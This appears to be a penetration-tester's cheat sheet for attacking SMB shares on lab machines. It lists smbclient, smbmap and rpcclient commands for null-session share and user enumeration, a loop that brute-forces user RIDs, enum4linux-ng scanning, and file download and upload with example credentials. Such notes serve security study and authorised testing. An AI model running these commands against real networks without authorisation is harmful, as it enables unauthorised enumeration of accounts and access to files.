For attacking [SMB](obsidian://open?vault=Obsidian%20Vault&file=Exploit%2FATTACKING%20COMMON%20SERVICES%2FAttacking%20SMB)
```bash
# List shares
smbclient -N -L //10.129.14.128
smbmap -H 10.129.14.128 (-r)

# List Shared with user
smbmap -H 10.129.182.46 -u dennis -p rockstar

# Connect to smb
smbclient //10.129.14.128/shareFolder

# connect with user
smbclient -U user \\\\10.129.42.197\\SHARENAME
Enter WORKGROUP\users password: password

# Enumeration with nmap
sudo nmap 10.129.14.128 -sV -sC -p139,445

# Execute commands on the smb server(check https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html to see all commands)
rpcclient -U "" 10.129.14.128
----------------------------------------------------------------------------------------
Query Description
# Server information.
srvinfo
# Enumerate all domains that are deployed in the network.
enumdomains
# Provides domain, server, and user information of deployed domains.
querydominfo
# Enumerates all available shares.
netsharegetinfo <share>
# Enumerates all domain users.
enumdomusers
# Provides information about a specific user.
queryuser <RID>
# Provides information about a specific group.
querygroup <GID>
----------------------------------------------------------------------------------------
# Bruteforce User RIDs
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

# Automatic tool to get a lot of info
./enum4linux-ng.py 10.129.14.128 -A

# Download / upload file
smbmap -H 10.129.14.128 --download "notes\note.txt"
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```
